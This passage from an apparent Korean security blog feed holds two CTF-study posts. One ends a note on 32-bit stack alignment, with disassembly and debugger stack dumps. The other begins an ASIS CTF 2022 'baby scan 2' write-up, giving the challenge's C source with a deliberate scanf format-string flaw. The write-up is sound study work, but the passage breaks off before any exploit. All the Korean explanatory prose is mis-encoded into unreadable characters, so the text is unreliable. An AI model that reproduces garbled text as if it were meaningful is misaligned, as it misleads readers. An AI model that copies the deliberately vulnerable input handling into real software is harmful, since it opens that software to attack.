ÎêòÏóàÎã§.</p><h3 id="4-memset-Ìï®Ïàò-Ìò∏Ï∂ú"><a href="#4-memset-Ìï®Ïàò-Ìò∏Ï∂ú" class="headerlink" title="4. memset Ìï®Ïàò Ìò∏Ï∂ú"></a>4. memset Ìï®Ïàò Ìò∏Ï∂ú</h3><p>ÏóêÌïÑÎ°úÍ∑∏ ÏßÑÌñâ ÌõÑ Ìï®ÏàòÎ•º Ìò∏Ï∂úÌï† Îïå Ïä§ÌÉùÏóê Ïù∏ÏûêÎì§Ïù¥ pushÎêòÎäî Í≤ÉÏùÑ ÏÇ¥Ìé¥Î≥¥Ïûê.</p><p>Î∂ÑÏÑùÌï† Ïñ¥ÏÖàÏùÄ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br><span class="line">   <span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line">   <span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line">   <span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line">   <span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line">   <span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line">‚Üí  <span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd900</span> ‚Üí <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Ïã§ÌñâÌïòÍ≥† ÎÇú ÌõÑ.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8f0‚îÇ+0x0000: 0xffffd900  ‚Üí  0x00000000‚Üê $esp</span><br><span class="line">0xffffd8f4‚îÇ+0x0004: 0x00000000</span><br><span class="line">0xffffd8f8‚îÇ+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd8fc‚îÇ+0x000c: 0x00000000</span><br><span class="line">0xffffd900‚îÇ+0x0010: 0x00000000  //&lt;-- Ïó¨Í∏∞ÏÑúÎ∂ÄÌÑ∞ 0x40 Î∞îÏù¥Ìä∏ Ï¥àÍ∏∞Ìôî</span><br><span class="line">0xffffd904‚îÇ+0x0014: 0x00000000</span><br><span class="line">0xffffd908‚îÇ+0x0018: 0x00000000</span><br><span class="line">0xffffd90c‚îÇ+0x001c: 0x00000000</span><br><span class="line">0xffffd910‚îÇ+0x0020: 0x00000000</span><br><span class="line">0xffffd914‚îÇ+0x0024: 0x00000000</span><br><span class="line"> </span><br><span class="line">0xffffd918‚îÇ+0x0028: 0x00000000</span><br><span class="line">0xffffd91c‚îÇ+0x002c: 0x00000000</span><br><span class="line">0xffffd920‚îÇ+0x0030: 0x00000000</span><br><span class="line">0xffffd924‚îÇ+0x0034: 0x00000000</span><br><span class="line">0xffffd928‚îÇ+0x0038: 0x00000000</span><br><span class="line">0xffffd92c‚îÇ+0x003c: 0x00000000</span><br><span class="line">0xffffd930‚îÇ+0x0040: 0x00000000</span><br><span class="line">0xffffd934‚îÇ+0x0044: 0x00000000</span><br><span class="line">0xffffd938‚îÇ+0x0048: 0x00000000</span><br><span class="line">0xffffd93c‚îÇ+0x004c: 0x00000000  //&lt;-- 0xffffd900 ~ 0xffffd93f ÍπåÏßÄ 0x40 Î∞îÏù¥Ìä∏Í∞Ä Ï¥àÍ∏∞Ìôî Îê®</span><br><span class="line"> </span><br><span class="line">0xffffd940‚îÇ+0x0050: 0x00000000  </span><br><span class="line">0xffffd944‚îÇ+0x0054: 0xffffd960  ‚Üí  0x00000001 //‚Üê $ecx</span><br><span class="line">0xffffd948‚îÇ+0x0058: 0x00000000‚Üê $ebp</span><br><span class="line">0xffffd94c‚îÇ+0x005c: 0xf7c1f119  ‚Üí   add esp, 0x10</span><br><span class="line">0xffffd950‚îÇ+0x0060: 0x00000000</span><br><span class="line">0xffffd954‚îÇ+0x0064: 0x00000000</span><br><span class="line">0xffffd958‚îÇ+0x0068: 0x8048354  ‚Üí  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95c‚îÇ+0x006c: 0xf7c1f119  ‚Üí   add esp, 0x10</span><br><span class="line">0xffffd960‚îÇ+0x0070: 0x00000001</span><br><span class="line">0xffffd964‚îÇ+0x0074: 0xffffda14  ‚Üí  0xffffdb90  ‚Üí  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br></pre></td></tr></table></figure><p>ecxÎ•º pushÌñàÍ∏∞ ÎïåÎ¨∏Ïóê alignÏù¥ ÎßûÏßÄ ÏïäÏïÑ buf ÌÅ¨Í∏∞Îäî 0x40Ïù¥ÏßÄÎßå espÎ•º 0x44ÎßåÌÅº Ïò¨Î†§Ï£ºÏóàÎã§.(bufÎ•º ÏúÑÌï¥ Í≥µÍ∞ÑÌôïÎ≥¥) </p><p>ÎòêÌïú Í≥ßÎ∞îÎ°ú espÎ•º 0x4 Ïò¨Î†§Ï£ºÏóàÎäîÎç∞, Ïù¥Îäî memsetÏùò Ïù∏ÏûêÎ•º Íµ¨ÏÑ±Ìï† Îïå alignÏùÑ ÎßûÏ∂∞Ï£ºÍ∏∞ ÏúÑÌï¥ÏÑúÏù¥Îã§.</p><p>Ïù¥ ÌõÑÏóê Ïã§ÏßàÏ†ÅÏúºÎ°ú memsetÏóêÏÑú ÏÇ¨Ïö©ÌïòÎäî ÏÑ∏ Í∞úÏùò Ïù∏ÏûêÎ•º pushÌñàÎã§. </p><h3 id="5-ÏóêÌïÑÎ°úÍ∑∏"><a href="#5-ÏóêÌïÑÎ°úÍ∑∏" class="headerlink" title="5. ÏóêÌïÑÎ°úÍ∑∏"></a>5. ÏóêÌïÑÎ°úÍ∑∏</h3><p>ÏóêÌïÑÎ°úÍ∑∏Ïóê ÎÇØÏÑ† Î™ÖÎ†πÏù¥ Ï∂îÍ∞ÄÎêòÏñ¥ ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret    </span><br></pre></td></tr></table></figure><p>Î¨¥ÏûëÏ†ï ÏùµÏä§Î•º ÏßÑÌñâÌïòÎ†§Í≥† Ìï† Îïå main+100ÏóêÏÑú ÌÑ∞Ï°åÏóàÎã§. Ïä§ÌÉù ÏÉÅÌô©Ïù¥ Î¨¥Ï°∞Í±¥ buf, ebp(sfp) ÏàúÏÑúÏûÑÏùÑ Í∏∞ÎåÄÌñàÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.<br>Ïã§Ï†úÎ°† buf, ecx(ebp-0x4), ebp(sfp) ÏàúÏù¥Îã§.</p><p>ebp ÏúÑÏπòÎùºÍ≥† ÏÉùÍ∞ÅÌïòÍ≥† ÎÑ£ÏóàÎçò Í∞íÏù¥ Ïã§Ï†úÎ°† ebp-0x4ÏòÄÍ∏∞ ÎïåÎ¨∏Ïóê ÌÑ∞Ï†∏Î≤ÑÎ†∏Îã§.</p><h1 id="For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary"><a href="#For-32bit-ROP-in-Pwnable-Stack-aligned-to-a-4-byte-boundary" class="headerlink" title="(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary."></a>(For 32bit ROP in Pwnable) Stack aligned to a 4-byte boundary.</h1><p>32bit ÌîÑÎ°úÍ∑∏Îû®ÏóêÏÑ† block Îã®ÏúÑÍ∞Ä 4Î∞îÏù¥Ìä∏Ïù¥Îã§. Îî∞ÎùºÏÑú Ïä§ÌÉù Íµ¨Ï°∞Îäî ÌÜµÏÉÅÏ†ÅÏúºÎ°ú ÏïåÍ≥† ÏûàÎäî Í∑∏ Íµ¨Ï°∞Í≥†, ÌîÑÎ°§Î°úÍ∑∏ÏôÄ ÏóêÌïÑÎ°úÍ∑∏ÎèÑ ÏïåÍ≥† ÏûàÎäî Í∑∏ Ïñ¥ÏÖàÏù¥Îã§. ÏûêÏÑ∏Ìûà ÏÑ§Î™ÖÌïòÏßÄ ÏïäÍ≥† ÏΩîÎìúÏôÄ Ïä§ÌÉù Íµ¨Ï°∞Îßå Î≥¥Ïó¨Ï£ºÍ≥† ÎÑòÏñ¥Í∞ÄÍ≤†Îã§.</p><p>Ï∞∏Í≥†Î°ú PwnableÏóêÏÑúÏùò 32bit ÌîÑÎ°úÍ∑∏Îû®ÏùÄ (Í±∞Ïùò) ÎåÄÎ∂ÄÎ∂Ñ <code>-mpreferred-stack-boundary=2</code> ÏòµÏÖòÏúºÎ°ú Ïª¥ÌååÏùºÎêòÏóàÎã§.</p><h3 id="disassemble-main-1"><a href="#disassemble-main-1" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491ee</span> &lt;+<span class="number">0</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491ef</span> &lt;+<span class="number">1</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">3</span>&gt;:sub    esp,<span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f4</span> &lt;+<span class="number">6</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x080491f6</span> &lt;+<span class="number">8</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">10</span>&gt;:lea    eax,[ebp<span class="number">-0x40</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">13</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">14</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x0804923b</span> &lt;+<span class="number">77</span>&gt;:leave  </span><br><span class="line"><span class="number">0x0804923c</span> &lt;+<span class="number">78</span>&gt;:ret    </span><br></pre></td></tr></table></figure><h3 id="memset-Ìï®Ïàò-Ìò∏Ï∂ú"><a href="#memset-Ìï®Ïàò-Ìò∏Ï∂ú" class="headerlink" title="memset Ìï®Ïàò Ìò∏Ï∂ú"></a>memset Ìï®Ïàò Ìò∏Ï∂ú</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>@plt (</span><br><span class="line">   [sp + <span class="number">0x0</span>] = <span class="number">0xffffd908</span> ‚Üí <span class="number">0x00000000</span>,</span><br><span class="line">   [sp + <span class="number">0x4</span>] = <span class="number">0x000000</span>,</span><br><span class="line">   [sp + <span class="number">0x8</span>] = <span class="number">0x000040</span>,</span><br><span class="line">   [sp + <span class="number">0xc</span>] = <span class="number">0x000000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0xffffd8fc‚îÇ+0x0000: 0xffffd908  ‚Üí  0x00000000‚Üê $esp</span><br><span class="line">0xffffd900‚îÇ+0x0004: 0x00000000</span><br><span class="line">0xffffd904‚îÇ+0x0008: 0x000040 (&quot;@&quot;?)</span><br><span class="line">0xffffd908‚îÇ+0x000c: 0x00000000  //&lt;-- Ïó¨Í∏∞ÏÑúÎ∂ÄÌÑ∞ 0x40Î∞îÏù¥Ìä∏ Ï¥àÍ∏∞Ìôî</span><br><span class="line">0xffffd90c‚îÇ+0x0010: 0x00000000</span><br><span class="line">0xffffd910‚îÇ+0x0014: 0x00000000</span><br><span class="line">0xffffd914‚îÇ+0x0018: 0x00000000</span><br><span class="line">0xffffd918‚îÇ+0x001c: 0x00000000</span><br><span class="line">0xffffd91c‚îÇ+0x0020: 0x00000000</span><br><span class="line">0xffffd920‚îÇ+0x0024: 0x00000000</span><br><span class="line"></span><br><span class="line">0xffffd924‚îÇ+0x0028: 0x00000000</span><br><span class="line">0xffffd928‚îÇ+0x002c: 0x00000000</span><br><span class="line">0xffffd92c‚îÇ+0x0030: 0x00000000</span><br><span class="line">0xffffd930‚îÇ+0x0034: 0x00000000</span><br><span class="line">0xffffd934‚îÇ+0x0038: 0x00000000</span><br><span class="line">0xffffd938‚îÇ+0x003c: 0x00000000</span><br><span class="line">0xffffd93c‚îÇ+0x0040: 0x00000000</span><br><span class="line">0xffffd940‚îÇ+0x0044: 0x00000000</span><br><span class="line">0xffffd944‚îÇ+0x0048: 0x00000000  //&lt;-- 0xffffd908 ~ 0xffffd947 ÍπåÏßÄ 0x40 Î∞îÏù¥Ìä∏Í∞Ä Ï¥àÍ∏∞Ìôî Îê®</span><br><span class="line">0xffffd948‚îÇ+0x004c: 0x00000000‚Üê $ebp </span><br><span class="line"></span><br><span class="line">0xffffd94c‚îÇ+0x0050: 0xf7c1f119  ‚Üí   add esp, 0x10</span><br><span class="line">0xffffd950‚îÇ+0x0054: 0x00000001</span><br><span class="line">0xffffd954‚îÇ+0x0058: 0xffffda04  ‚Üí  0xffffdb8e  ‚Üí  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd958‚îÇ+0x005c: 0xffffda0c  ‚Üí  0xffffdbb0  ‚Üí  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd95c‚îÇ+0x0060: 0xffffd970  ‚Üí  0xf7e1fe34  ‚Üí  0x0021fd4c</span><br><span class="line">0xffffd960‚îÇ+0x0064: 0xf7e1fe34  ‚Üí  0x0021fd4c</span><br><span class="line">0xffffd964‚îÇ+0x0068: 0x80491ee  ‚Üí  &lt;main+0&gt; push ebp</span><br><span class="line">0xffffd968‚îÇ+0x006c: 0x00000001</span><br><span class="line">0xffffd96c‚îÇ+0x0070: 0xffffda04  ‚Üí  0xffffdb8e  ‚Üí  &quot;/home/jir4vvit/study/rop32/challr&quot;</span><br><span class="line">0xffffd970‚îÇ+0x0074: 0xf7e1fe34  ‚Üí  0x0021fd4c</span><br></pre></td></tr></table></figure><h1 id="More"><a href="#More" class="headerlink" title="More"></a>More</h1><p>Ï∞∏Í≥†Î°ú 64bit ÌîÑÎ°úÍ∑∏Îû®ÏóêÏÑúÎäî block Îã®ÏúÑÍ∞Ä 4Î∞îÏù¥Ìä∏ÏóêÏÑú 8Î∞îÏù¥Ìä∏Î°ú ÎäòÏñ¥ÎÇ¨Í∏∞ ÎïåÎ¨∏Ïóê <code>-mpreferred-stack-boundary=2</code> ÏòµÏÖòÏùÑ ÏÇ¨Ïö©ÌïòÎ†§Í≥† ÌïòÎ©¥ ÏóêÎü¨Î•º ÎÇ¥ÎøúÎäîÎã§.</p><h3 id="Í∂ÅÍ∏àÏ¶ù"><a href="#Í∂ÅÍ∏àÏ¶ù" class="headerlink" title="Í∂ÅÍ∏àÏ¶ù"></a>Í∂ÅÍ∏àÏ¶ù</h3><p>Î¨¥Î†§ 6ÎÖÑ 9Í∞úÏõî Ï†Ñ Ïñ¥Îñ§ Î∂ÑÏù¥ ÌïòÏã† Í∂ÅÍ∏àÏ¶ùÍ≥º ÎèôÏùºÌïú Í∂ÅÍ∏àÏ¶ùÏùÑ Í∞ÄÏ°åÎã§. ÏïàÌÉÄÍπùÍ≤åÎèÑ Ìï¥Îãπ ÏßàÎ¨∏Ïóê ÎåÄÌïú ÎãµÏùÄ Ï∞æÏïÑÎ≥¥Í∏∞ Ïñ¥Î†§Ïõ†Îã§. </p><p>I noticed that when not using -mpreferred-stack-boundary&#x3D;2, gcc might compile ‚Äúmain‚Äù with an interesting prologue&#x2F;epilogue: effectively ‚Äúrelying on $ecx (which relies on $ebp-4) for $esp value before ret‚Äù. Has anyone else come across this observation?</p><p>This means you can not overwrite normal ret address staying at $ebp+4, but instead you have to overwrite $ebp-4 (that is ecx) and reposition the stack pointer and your return address (effectively using a stack pivot) to further the exploitation.</p><ul><li><a href="https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2">https://security.stackexchange.com/questions/110943/how-to-exploit-a-stack-overflow-without-setting-mpreferred-stack-boundary-2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> stack alignment </tag>
            
            <tag> gcc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASIS CTF 2022 - baby scan 2 (fsb, scanf)</title>
      <link href="/221018-asisctf2022-babysacn_2/"/>
      <url>/221018-asisctf2022-babysacn_2/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(41&#x2F;532) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>It seems that the app scans every incoming message and simply removes the rude and offending phrase before displaying the original message.</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îú‚îÄ‚îÄ bin</span><br><span class="line">‚îÇ¬†¬† ‚îî‚îÄ‚îÄ chall</span><br><span class="line">‚îú‚îÄ‚îÄ lib</span><br><span class="line">‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ld-2.31.so</span><br><span class="line">‚îÇ¬†¬† ‚îî‚îÄ‚îÄ libc.so.6</span><br><span class="line">‚îú‚îÄ‚îÄ run.sh</span><br><span class="line">‚îî‚îÄ‚îÄ src</span><br><span class="line">    ‚îî‚îÄ‚îÄ main.c</span><br></pre></td></tr></table></figure><h3 id="making-patched-chall"><a href="#making-patched-chall" class="headerlink" title="making patched chall"></a>making patched chall</h3><p>libcÏôÄ ldÍ∞Ä Ï£ºÏñ¥Ï°åÏúºÎãà remote ÌôòÍ≤ΩÍ≥º ÎèôÏùºÌïòÍ≤å challÏùÑ Íµ¨ÏÑ±ÌïòÍ∏∞ ÏúÑÌï¥ patchÎ•º ÏßÑÌñâÌñàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch bin]$ ldd pchall </span><br><span class="line">linux-vdso.so.1 (0x00007ffc2bd90000)</span><br><span class="line">./../lib/libc.so.6 (0x00007f46adf9f000)</span><br><span class="line">./../lib/ld-2.31.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f46ae193000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(atoi(size) + <span class="number">1</span>); <span class="comment">// difference of babyscan_1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>baby scan 1</code> Î¨∏Ï†úÏôÄ Îã§Î•∏ Ï†êÏùÄ Îî± ÌïòÎÇòÎã§. <code>size+1</code> ÌÅ¨Í∏∞Î•º Ïä§ÌÉùÏù¥ ÏïÑÎãå ÌûôÏóê Ìï†ÎãπÌïúÎã§. Îî∞ÎùºÏÑú <code>baby scan 1</code> Ï≤òÎüº ÌíÄÏù¥Î•º ÏßÑÌñâÌïúÎã§Î©¥ Ìûô Ïò§Î≤ÑÌîåÎ°úÏö∞Í∞Ä ÎÇòÌÉÄÎÇòÍ≤å ÎêúÎã§. ÌïòÏßÄÎßå Ïù¥ Ï∑®ÏïΩÏ†êÎßåÏúºÎ°† ÏùµÏä§Í∞Ä Î∂àÍ∞ÄÎä•ÌïòÎã§. freeÎèÑ ÏóÜÍ≥† Îã®ÏàúÌûà Ìûô Ìï†Îãπ Ìïú Î≤à Í∞ÄÏßÄÍ≥†Îäî Ìï† Ïàò ÏûàÎäî Í≤å ÏóÜÎã§. Ìûô Ïò§Î≤ÑÎ•º Ïù¥Ïö©Ìï¥ÏÑú Îã§Ïùå chunckÏùò sizeÎ•º Ï°∞Ï†àÍ∞ÄÎä•ÌïòÏßÄÎßå Ïì∏Î™®ÏóÜÎã§. Í∑∏ÎûòÏÑú Îã§Î•∏ Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÏïÑÏïº ÌïúÎã§. Ïù¥ Í≥ºÏ†ïÏóêÏÑú ÏãúÍ∞ÑÏùÑ ÎßéÏù¥ ÌóàÎπÑÌï¥ÏÑú ÎåÄÌöå ÏãúÍ∞Ñ ÎÇ¥Ïóê ÌíÄÏßÄ Î™ªÌïòÏòÄÎã§.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>ÎèôÏûë Í≥ºÏ†ïÏùÑ ÏÇ¥Ìé¥Î≥¥Î©¥ÏÑú Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÏïÑÎ≥¥Ïûê.</p><ol><li><p>sizeÏóê 15Í∏ÄÏûêÎ•º Î∞õÎäîÎã§. (16Í∏ÄÏûêÍ∞Ä ÏïÑÎãàÎùº 15Í∏ÄÏûêÎã§.. Ïù¥Í≤É ÎïåÎ¨∏Ïóê ÏùµÏä§ÏΩîÎìú ÏûëÏÑ±Ìï† Îïå Ï¥àÎ∞òÏóê ÏÇΩÏßàÌñàÎã§.) <em>&lt;‚Äì<code>scanf</code>Ïùò Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ Ïó¨Í∏∞ÏÑú ÏûÖÎ†•Ìï¥Ïïº ÌïúÎã§.</em></p></li><li><p>size+1 ÎßåÌÅº Ìûô Ìï†ÎãπÏùÑ ÏßÑÌñâÌïúÎã§. <em>&lt;‚ÄìÏÇ¨Ïã§ÏÉÅ Ïã†Í≤ΩÏïàÏç®ÎèÑ ÎêúÎã§.</em></p></li><li><p><code>snprintf</code>Î•º Ïù¥Ïö©ÌïòÏó¨ Ìûô ÏûÖÎ†•Ïóê ÏÇ¨Ïö©Îê† <code>scanf</code>Ïùò Ìè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ Ï†ïÏùòÌïúÎã§. <em>&lt;‚ÄìÌè¨Îß∑Ïä§Ìä∏ÎßÅÏùÑ Ïñ¥Ï∞åÏñ¥Ï∞å Ïûò Ï†ïÏùòÌï¥ÏÑú</em></p></li><li><p>Ìï†ÎãπÌïú ÌûôÏóê <code>scanf</code>Î•º Ïù¥Ïö©ÌïòÏó¨ ÏûÖÎ†•ÏùÑ ÏßÑÌñâÌïúÎã§. <em>&lt;‚ÄìfsbÎ•º Ìä∏Î¶¨Í±∞Ìï¥ÏÑú ÏõêÌïòÎäî ÏúÑÏπòÏóê 